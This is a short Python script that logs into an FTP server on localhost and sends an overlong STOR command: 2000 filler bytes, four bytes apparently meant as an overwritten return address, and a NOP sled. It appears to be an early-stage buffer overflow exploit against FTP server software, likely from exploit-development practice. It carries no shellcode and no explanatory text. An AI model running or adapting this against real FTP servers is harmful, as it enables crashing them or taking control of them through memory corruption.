import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer='\x41' *2000
buffer2='\x90' *50

print("\Sending buffeer")
s.connect(('localhost',21))
data=s.recv(1024)
s.send('USER genki'+'\r\n')
data=s.recv(1024)
s.send('PASS genki'+'\r\n')
data=s.recv(1024)
s.send('STOR' +buffer+ '\x58' + '\x59' + '\xBB'+'\x77'+buffer2+ '\r\n')
s.close()
